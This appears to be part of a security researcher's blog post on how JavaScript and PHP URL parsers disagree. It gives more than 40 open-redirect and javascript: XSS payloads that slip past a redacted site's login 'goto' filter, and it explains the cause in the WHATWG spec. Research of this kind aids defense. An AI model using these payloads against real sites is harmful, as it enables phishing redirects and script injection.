+</span></span><span class="line"><span class="cl"><span class="nx">URL</span> <span class="p">{</span> <span class="nx">href</span><span class="o">:</span> <span class="s2">&#34;http://localhost/xxxx&#34;</span><span class="p">,</span> <span class="nx">origin</span><span class="o">:</span> <span class="s2">&#34;http://localhost&#34;</span><span class="p">,</span> <span class="nx">protocol</span><span class="o">:</span> <span class="s2">&#34;http:&#34;</span><span class="p">,</span> <span class="nx">username</span><span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nx">password</span><span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nx">host</span><span class="o">:</span> <span class="s2">&#34;localhost&#34;</span><span class="p">,</span> <span class="nx">hostname</span><span class="o">:</span> <span class="s2">&#34;localhost&#34;</span><span class="p">,</span> <span class="nx">port</span><span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nx">pathname</span><span class="o">:</span> <span class="s2">&#34;/xxxx&#34;</span><span class="p">,</span> <span class="nx">search</span><span class="o">:</span> <span class="s2">&#34;&#34;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kr">debugger</span> <span class="nb">eval</span> <span class="nx">code</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="mi">13</span>
+</span></span><span class="line"><span class="cl"><span class="nx">i</span><span class="o">:</span> <span class="mi">10</span> <span class="nx">URL</span> <span class="nx">encoded</span> <span class="nx">i</span> <span class="o">:</span> <span class="o">%</span><span class="mi">0</span><span class="nx">A</span> <span class="kr">debugger</span> <span class="nb">eval</span> <span class="nx">code</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="mi">13</span>
+</span></span><span class="line"><span class="cl"><span class="nx">URL</span> <span class="p">{</span> <span class="nx">href</span><span class="o">:</span> <span class="s2">&#34;http://localhost/xxxx&#34;</span><span class="p">,</span> <span class="nx">origin</span><span class="o">:</span> <span class="s2">&#34;http://localhost&#34;</span><span class="p">,</span> <span class="nx">protocol</span><span class="o">:</span> <span class="s2">&#34;http:&#34;</span><span class="p">,</span> <span class="nx">username</span><span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nx">password</span><span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nx">host</span><span class="o">:</span> <span class="s2">&#34;localhost&#34;</span><span class="p">,</span> <span class="nx">hostname</span><span class="o">:</span> <span class="s2">&#34;localhost&#34;</span><span class="p">,</span> <span class="nx">port</span><span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nx">pathname</span><span class="o">:</span> <span class="s2">&#34;/xxxx&#34;</span><span class="p">,</span> <span class="nx">search</span><span class="o">:</span> <span class="s2">&#34;&#34;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kr">debugger</span> <span class="nb">eval</span> <span class="nx">code</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="mi">13</span>
+</span></span><span class="line"><span class="cl"><span class="nx">i</span><span class="o">:</span> <span class="mi">13</span> <span class="nx">URL</span> <span class="nx">encoded</span> <span class="nx">i</span> <span class="o">:</span> <span class="o">%</span><span class="mi">0</span><span class="nx">D</span> <span class="kr">debugger</span> <span class="nb">eval</span> <span class="nx">code</span><span class="o">:</span><span class="mi">6</span><span class="o">:</span><span class="mi">13</span>
+</span></span><span class="line"><span class="cl"><span class="nx">URL</span> <span class="p">{</span> <span class="nx">href</span><span class="o">:</span> <span class="s2">&#34;http://localhost/xxxx&#34;</span><span class="p">,</span> <span class="nx">origin</span><span class="o">:</span> <span class="s2">&#34;http://localhost&#34;</span><span class="p">,</span> <span class="nx">protocol</span><span class="o">:</span> <span class="s2">&#34;http:&#34;</span><span class="p">,</span> <span class="nx">username</span><span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nx">password</span><span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nx">host</span><span class="o">:</span> <span class="s2">&#34;localhost&#34;</span><span class="p">,</span> <span class="nx">hostname</span><span class="o">:</span> <span class="s2">&#34;localhost&#34;</span><span class="p">,</span> <span class="nx">port</span><span class="o">:</span> <span class="s2">&#34;&#34;</span><span class="p">,</span> <span class="nx">pathname</span><span class="o">:</span> <span class="s2">&#34;/xxxx&#34;</span><span class="p">,</span> <span class="nx">search</span><span class="o">:</span> <span class="s2">&#34;&#34;</span> <span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="kr">debugger</span> <span class="nb">eval</span> <span class="nx">code</span><span class="o">:</span><span class="mi">7</span><span class="o">:</span><span class="mi">13</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Array</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="p">[</span> <span class="mi">9</span><span class="p">,</span> <span class="mi">10</span><span class="p">,</span> <span class="mi">13</span> <span class="p">]</span>
+</span></span></code></pre></div><p>payloads:</p>
+<pre tabindex="0"><code>ht%0dtp://localhost
+ht%0atp://localhost
+ht%09tp://localhost
+java%09script:alert(1)
+java%0dscript:alert(1)
+java%0ascript:alert(1)
+</code></pre><p>So how does PHP&rsquo;s URL parser handle these malformed urls?</p>
+<pre tabindex="0"><code>  [&#34;ht%0dtp://localhost&#34;]=&gt;
+  array(1) {
+    [&#34;path&#34;]=&gt;
+    string(19) &#34;ht%0dtp://localhost&#34;
+  }
+  [&#34;ht%0atp://localhost&#34;]=&gt;
+  array(1) {
+    [&#34;path&#34;]=&gt;
+    string(19) &#34;ht%0atp://localhost&#34;
+  }
+  [&#34;ht%09tp://localhost&#34;]=&gt;
+  array(1) {
+    [&#34;path&#34;]=&gt;
+    string(19) &#34;ht%09tp://localhost&#34;
+  }
+  [&#34;java%09script:alert(1)&#34;]=&gt;
+  array(1) {
+    [&#34;path&#34;]=&gt;
+    string(22) &#34;java%09script:alert(1)&#34;
+  }
+  [&#34;java%0dscript:alert(1)&#34;]=&gt;
+  array(1) {
+    [&#34;path&#34;]=&gt;
+    string(22) &#34;java%0dscript:alert(1)&#34;
+  }
+  [&#34;java%0ascript:alert(1)&#34;]=&gt;
+  array(1) {
+    [&#34;path&#34;]=&gt;
+    string(22) &#34;java%0ascript:alert(1)&#34;
+  }
+</code></pre><p>Once again, PHP&rsquo;s URL parser considers these urls to be &lsquo;canonical&rsquo; relative urls, all of which pass redacted fitler&rsquo;s check</p>
+<pre tabindex="0"><code>https://demo.redacted.com/login?goto=ht%0dtp://baidu.com
+https://demo.redacted.com/login?goto=ht%0atp://baidu.com
+https://demo.redacted.com/login?goto=ht%09tp://baidu.com
+https://demo.redacted.com/login?goto=java%09script:alert(1)
+https://demo.redacted.com/login?goto=java%0dscript:alert(1)
+https://demo.redacted.com/login?goto=java%0ascript:alert(1)
+</code></pre><p>These three characters can actually be placed anywhere in scheme:</p>
+<pre tabindex="0"><code>https://demo.redacted.com/login?goto=java%0asc%0aript:alert(1)
+</code></pre>
+
+<h3 class="relative group">Summary 
+    <div id="summary" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#summary" aria-label="Anchor">#</a>
+    </span>        
+    
+</h3>
+<p>By further studying the inconsistency between javascript URL parser and php URL parser, I found more than 40 methods to bypass redacted filter:</p>
+<pre tabindex="0"><code>https://demo.redacted.com/login?goto=http://baidu.com\@demo.redacted.com/
+https://demo.redacted.com/login?goto=javascript:///%250dalert(1)
+https://demo.redacted.com/login?goto=http:///www.baidu.com
+https://demo.redacted.com/login?goto=http:\//www.baidu.com
+https://demo.redacted.com/login?goto=http:%0d\\www.baidu.com
+https://demo.redacted.com/login?goto=http:%0a\\www.baidu.com
+https://demo.redacted.com/login?goto=http:%09\\www.baidu.com
+https://demo.redacted.com/login?goto=javascript%0d:alert(1) 
+https://demo.redacted.com/login?goto=javascript%0a:alert(1) 
+https://demo.redacted.com/login?goto=javascript%09:alert(1) 
+https://demo.redacted.com/login?goto=http%09://baidu.com 
+https://demo.redacted.com/login?goto=%00javascript:alert(1)
+https://demo.redacted.com/login?goto=%01javascript:alert(1)
+https://demo.redacted.com/login?goto=%02javascript:alert(1)
+https://demo.redacted.com/login?goto=%03javascript:alert(1)
+https://demo.redacted.com/login?goto=%04javascript:alert(1)
+https://demo.redacted.com/login?goto=%05javascript:alert(1)
+https://demo.redacted.com/login?goto=%06javascript:alert(1)
+https://demo.redacted.com/login?goto=%07javascript:alert(1)
+https://demo.redacted.com/login?goto=%08javascript:alert(1)
+https://demo.redacted.com/login?goto=%09javascript:alert(1)
+https://demo.redacted.com/login?goto=%0Ajavascript:alert(1)
+https://demo.redacted.com/login?goto=%0Bjavascript:alert(1)
+https://demo.redacted.com/login?goto=%0Cjavascript:alert(1)
+https://demo.redacted.com/login?goto=%0Djavascript:alert(1)
+https://demo.redacted.com/login?goto=%0Ejavascript:alert(1)
+https://demo.redacted.com/login?goto=%0Fjavascript:alert(1)
+https://demo.redacted.com/login?goto=%10javascript:alert(1)
+https://demo.redacted.com/login?goto=%11javascript:alert(1)
+https://demo.redacted.com/login?goto=%12javascript:alert(1)
+https://demo.redacted.com/login?goto=%13javascript:alert(1)
+https://demo.redacted.com/login?goto=%14javascript:alert(1)
+https://demo.redacted.com/login?goto=%15javascript:alert(1)
+https://demo.redacted.com/login?goto=%16javascript:alert(1)
+https://demo.redacted.com/login?goto=%17javascript:alert(1)
+https://demo.redacted.com/login?goto=%18javascript:alert(1)
+https://demo.redacted.com/login?goto=%19javascript:alert(1)
+https://demo.redacted.com/login?goto=%1Ajavascript:alert(1)
+https://demo.redacted.com/login?goto=%1Bjavascript:alert(1)
+https://demo.redacted.com/login?goto=%1Cjavascript:alert(1)
+https://demo.redacted.com/login?goto=%1Djavascript:alert(1)
+https://demo.redacted.com/login?goto=%1Ejavascript:alert(1)
+https://demo.redacted.com/login?goto=%1Fjavascript:alert(1)
+https://demo.redacted.com/login?goto=%20javascript:alert(1)
+https://demo.redacted.com/login?goto=ht%0dtp://baidu.com
+https://demo.redacted.com/login?goto=ht%0atp://baidu.com
+https://demo.redacted.com/login?goto=ht%09tp://baidu.com
+https://demo.redacted.com/login?goto=java%09script:alert(1)
+https://demo.redacted.com/login?goto=java%0dscript:alert(1)
+https://demo.redacted.com/login?goto=java%0ascript:alert(1)
+https://demo.redacted.com/login?goto=java%0asc%0aript:alert(1)
+</code></pre>
+
+<h2 class="relative group">The root cause 
+    <div id="the-root-cause" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#the-root-cause" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>Why is there such a big inconsistency between javascript URL parser and PHP URL parser?</p>
+<p>Because there are two URL resolution standards: the RFC standard and the WHATWG standard</p>
+<p>javascript URL parser follows the WHATWG standard, while PHP URL parser and other back-end language(excluding Nodejs) URL Parsers follow the RFC specification !</p>
+<p>The WHATWG has developed its own set of standards based on the RFC standard: <a href="https://url.spec.whatwg.org/#url-parsing" target="_blank"> URL parsing </a></p>
+<p>Here&rsquo;s what the WHATWG spec says:</p>
+<blockquote>
+<ol>
+<li>If input contains any leading or trailing C0 control or space, validation error.</li>
+<li>Remove any leading and trailing C0 control or space from input.</li>
+</ol>
+</blockquote>
+<p>If the input URL starts and ends with the C0 controller and space, a validtion error is reported and all the C0 controllers and Spaces given in the input are deleted, where the range of C0 control is: 0x00-0x1F, the range of space is 0x20, so the range of C0 control + space is 0x00-0x20</p>
+<p>So what is <a href="https://url.spec.whatwg.org/#validation-error" target="_blank">the validation error</a>?</p>
+<p>The WHATWG standard is to say:</p>
+<blockquote>
+<p>A validation error indicates a mismatch between input and valid input. User agents, especially conformance checkers, are encouraged to report them somewhere.A validation error does not mean that the parser terminates. Termination of a parser is always stated explicitly, e.g., through a return statement.</p>
+</blockquote>
+<p>A validtion error simply indicates a mismatch between input and valid input, and does not imply parsing termination. The standard <code>encourages</code> implementers to report it somewhere, and parser termination is always explicitly stated, for example, by a return statement.</p>
+<p>That&rsquo;s why these payloads work:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">https</span><span class="o">:</span><span class="c1">//demo.redacted.com/login?goto=%00javascript:alert(1)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">https</span><span class="o">:</span><span class="c1">//demo.redacted.com/login?goto=%01javascript:alert(1)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">https</span><span class="o">:</span><span class="c1">//demo.redacted.com/login?goto=%02javascript:alert(1)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">...</span>
+</span></span><span class="line"><span class="cl"><span class="nx">https</span><span class="o">:</span><span class="c1">//demo.redacted.com/login?goto=%20javascript:alert(1)
+</span></span></span></code></pre></div><p>And then the WHATWG standard says:</p>
+<blockquote>
+<ol>
+<li>If input contains any ASCII tab or newline, validation error.</li>
+<li>Remove all ASCII tab or newline from input.</li>
+</ol>
+</blockquote>
+<p>Scope of <a href="https://infra.spec.whatwg.org/#ascii-tab-or-newline" target="_blank">ASCII TAB or newline</a>:</p>
+<blockquote>
+<p>An ASCII tab or newline is U+0009 TAB, U+000A LF, or U+000D CR.</p>
+</blockquote>
+<p>That&rsquo;s why these payloads work:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="nx">https</span><span class="o">:</span><span class="c1">//demo.redacted.com/login?goto=ht%0dtp://baidu.com
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">https</span><span class="o">:</span><span class="c1">//demo.redacted.com/login?goto=ht%0atp://baidu.com
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">https</span><span class="o">:</span><span class="c1">//demo.redacted.com/login?goto=ht%09tp://baidu.com
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">https</span><span class="o">:</span><span class="c1">//demo.redacted.com/login?goto=java%09script:alert(1)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">https</span><span class="o">:</span><span class="c1">//demo.redacted.com/login?goto=java%0dscript:alert(1)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">https</span><span class="o">:</span><span class="c1">//demo.redacted.com/login?goto=java%0ascript:alert(1)
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">https</span><span class="o">:</span><span class="c1">//demo.redacted.com/login?goto=java%0asc%0aript:alert(1)
+</span></span></span></code></pre></div><p>This means that %0d %0a %09 can be placed anywhere in the URL, since js URL parser will remove them anyway, for example</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-js" data-lang="js"><span class="line"><span class="cl"><span class="k">new</span> <span class="nx">URL</span><span class="p">(</span><span class="s1">&#39;http:/\x09/baidu.com&#39;</span><span class="p">)</span> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nx">URL</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">origin</span><span class="o">:</span> <span class="s1">&#39;http://baidu.com&#39;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">    <span class="nx">protocol</span><span class="o">:</span> <span class="s1">&#39;http:&#39;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">    <span class="nx">username</span><span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">    <span class="nx">password</span><span class="o">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> 
+</span></span><span class="line"><span class="cl">    <span class="nx">host</span><span class="o">:</span> <span class="s1">&#39;baidu.com&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div>
+
+<h2 class="relative group">Summary 
+    <div id="summary-1" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#summary-1" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>The worst thing in the world is having two sets of standards for the same thing. If there is inconsistency in the standards, there will inevitably be inconsistency in the implementation. Security issues arising from inconsistencies are concealed because when you audit a single system, you may think there are no security problems. However, when you connect multiple systems to work together, security issues will emerge. This also illustrates that when auditing security issues, it is necessary to consider the overall situation rather than auditing a single system.</p>
+<p>At the same time, it is worth noting that wherever standards and specifications are not clearly defined or ambiguous, there will be discrepancies in understanding among developers who implement the standards. This can lead to inconsistencies between various languages, libraries, frameworks, and software that follow the standard implementation. Such inconsistencies are fertile ground for creating new attack techniques.</p>
+
+
+<h2 class="relative group">Keep in touch 
+    <div id="keep-in-touch" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#keep-in-touch" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<p>If you have any questions or good research direction, please feel free to contact me:</p>
+<ul>
+<li>Email: <a href="mailto:hdrw1024@gmail.com">hdrw1024@gmail.com</a></li>
+<li>Twitter: <a href="https://twitter.com/RuiShang9" target="_blank">https://twitter.com/RuiShang9</a></li>
+<li>Blog: <a href="https://shangrui-hash.github.io/en/" target="_blank">https://shangrui-hash.github.io/en/</a></li>
+<li>Medium: <a href="https://medium.com/@hdrw1024" target="_blank">https://medium.com/@hdrw1024</a></li>
+<li>Github: <a href="https://github.com/ShangRui-hash" target="_blank">https://github.com/ShangRui-hash</a></li>
+</ul>
+
+
+<h2 class="relative group">Reference 
+    <div id="reference" class="anchor"></div>
+    
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#reference" aria-label="Anchor">#</a>
+    </span>        
+    
+</h2>
+<ul>
+<li><a href="https://infra.spec.whatwg.org/#c0-control-or-space" target="_blank">whatwg - C0 control 标准</a></li>
+<li><a href="https://url.spec.whatwg.org/#url-parsing" target="_blank">whatwg - URL parsing 标准</a></li>
+<li><a href="https://url.spec.whatwg.org/#validation-error" target="_blank">whatwg - validation error</a></li>
+<li><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf" target="_blank">A New Era of SSRF - Exploiting URL Parser in Trending Programming Languages!</a></li>
+<li><a href="https://claroty.com/wp-content/uploads/2022/01/Exploiting-URL-Parsing-Confusion.pdf" target="_blank">EXPLOITING URL PARSERS: THE GOOD, BAD, AND INCONSISTENT</a></li>
+<li><a href="https://www.youtube.com/watch?v=0uejy9aCNbI&amp;list=RDCMUClcE-kVhqyiHCcjYwcpfj9w&amp;index=3" target="_blank">HOW FRCKN&rsquo; HARD IS IT TO UNDERSTAND A URL?! - uXSS CVE-2018-6128</a></li>
+<li><a href="https://www.youtube.com/watch?v=gVrdE6g_fa8&amp;t=239s" target="_blank">How did Masato find the Google Search XSS?</a></li>
+<li><a href="https://www.youtube.com/watch?v=yq_P3dzGiK4&amp;t=2s" target="_blank">Fuzzing Browsers for weird XSS Vectors</a></li>
+<li><a href="https://daniel.haxx.se/blog/2017/01/30/one-url-standard-please/" target="_blank">2017/Daniel Stenberg/ONE URL STANDARD PLEASE</a></li>
+<li><a href="https://daniel.haxx.se/blog/2022/01/10/dont-mix-url-parsers/" target="_blank">2022/Daniel Stenberg/DON’T MIX URL PARSERS</a></li>
+</ul>
+
+          
+          
+          
+        </div>
+        
+        
+
+        
+        
+
+          
+      </div>
+     
+      
+      
+        
+        
+          
+          
+        
+      <script>
+        var oid = "views_posts\/a_research_of_inconsistencies_in_front_and_backend_URL_parsers.md"
+        var oid_likes = "likes_posts\/a_research_of_inconsistencies_in_front_and_backend_URL_parsers.md"
+      </script>
+      
+      
+      <script type="text/javascript" src="/js/page.min.b06a29d42a4ed16787978e2eee1e8c797b7698db2bc14ccee78f5c80ac566fc996190a73ad80a5e987558474b20b96fa38f7d85b405f165ff72b7b163c5ad11b.js" integrity="sha512-sGop1CpO0WeHl44u7h6MeXt2mNsrwUzO549cgKxWb8mWGQpzrYCl6YdVhHSyC5b6OPfYW0BfFl/3K3sWPFrRGw=="></script>
+      
+  
+    </section>
+  <footer class="pt-8 max-w-prose print:hidden">
+
+    
+  
+    
+    
+    
+    <div class="pt-8">
+      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
+      <div class="flex justify-between pt-3">
+        <span>
+          
+            <a class="flex group mr-3" href="/en/posts/xss-via-server-side-mime-sniff/">
+              <span
+                class="mr-3 text-neutral-700 group-hover:text-primary-600 ltr:inline rtl:hidden dark:text-neutral dark:group-hover:text-primary-400"
+                >&larr;</span
+              >
+              <span
+                class="ml-3 text-neutral-700 group-hover:text-primary-600 ltr:hidden rtl:inline dark:text-neutral dark:group-hover:text-primary-400"
+                >&rarr;</span
+              >
+              <span class="flex flex-col">
+                <span
+                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
+                  >Server-Side MIME Sniff resulting from Go language project containerization</span
+                >
+                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
+                  
+                    <time datetime="2023-03-02T01:49:29&#43;08:00">2 March 2023</time>
+                  
+                </span>
+              </span>
+            </a>
+          
+        </span>
+        <span>
+          
+        </span>
+      </div>
+    </div>
+  
+
+
+    
+  </footer>
+</article>
+
+      <div id="top-scroller" class="pointer-events-none absolute top-[110vh] bottom-0 w-12 ltr:right-0 rtl:left-0">
+  <a href="#the-top"
+    class="pointer-events-auto sticky top-[calc(100vh-5.5rem)] flex h-12 w-12 mb-16 items-center justify-center rounded-full bg-neutral/50 text-xl text-neutral-700 hover:text-primary-600 dark:bg-neutral-800/50 dark:text-neutral dark:hover:text-primary-400"
+    aria-label="Scroll to top" title="Scroll to top">
+    &uarr;
+  </a>
+</div>
+    </main><footer id="site-footer" class="py-10 print:hidden">
+  
+  
+    
+  
+  <div class="flex items-center justify-between">
+
+    
+    
+    <p class="text-sm text-neutral-500 dark:text-neutral-400">
+      &copy;
+      2025
+      无在无不在
+    </p>
+    
+
+    
+    
+    <p class="text-xs text-neutral-500 dark:text-neutral-400">
+      
+      
+      Powered by <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+        href="https://gohugo.io/" target="_blank" rel="noopener noreferrer">Hugo</a> &amp; <a class="hover:underline hover:decoration-primary-400 hover:text-primary-500"
+        href="https://blowfish.page/" target="_blank" rel="noopener noreferrer">Blowfish</a>
+    </p>
+    
+
+  </div>
+  <script>
+    
+    mediumZoom(document.querySelectorAll("img:not(.nozoom)"), {
+      margin: 24,
+      background: 'rgba(0,0,0,0.5)',
+      scrollOffset: 0,
+    })
+    
+  </script>
+  
+  
+  <script type="text/javascript" src="/js/process.min.62060bb247f4de2b6dde45903668fefb68d792f365587605177b1227c0cf43588701edaca0cb40e2c8e2789bd5ce67c1d2a215b9fb258c3496a7cd25e7cb5fdf.js" integrity="sha512-YgYLskf03itt3kWQNmj&#43;&#43;2jXkvNlWHYFF3sSJ8DPQ1iHAe2soMtA4sjieJvVzmfB0qIVufsljDSWp80l58tf3w=="></script>
+  
+  
+</footer>
+<div
+  id="search-wrapper"
+  class="invisible fixed inset-0 flex h-screen w-screen cursor-default flex-col bg-neutral-500/50 p-4 backdrop-blur-sm dark:bg-neutral-900/50 sm:p-6 md:p-[10vh] lg:p-[12vh]"
+  data-url="https://shangrui-hash.github.io/en/"
+  style="z-index:500"
+>
+  <div
+    id="search-modal"
+    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg top-20 border-neutral-200 bg-neutral dark:border-neutral-700 dark:bg-neutral-800"
+  >
+    <header class="relative z-10 flex items-center justify-between flex-none px-2">
+      <form class="flex items-center flex-auto min-w-0">
+        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
+          
+
+  <span class="relative block icon">
+    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
+
+  </span>
+
+
+        </div>
+        <input
+          type="search"
+          id="search-query"
+          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-2 focus:outline-transparent"
+          placeholder="Search"
+          tabindex="0"
+        />
+      </form>
+      <button
+        id="close-search-button"
+        class="flex items-center justify-center w-8 h-8 text-neutral-700 hover:text-primary-600 dark:text-neutral dark:hover:text-primary-400"
+        title="Close (Esc)"
+      >
+        
+
+  <span class="relative block icon">
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
+
+  </span>
+
+
+      </button>
+    </header>
+    <section class="flex-auto px-2 overflow-auto">
+      <ul id="search-results">
+        
+      </ul>
+    </section>
+  </div>
+</div>
+
+  </div>
+</body>
+
+</html>
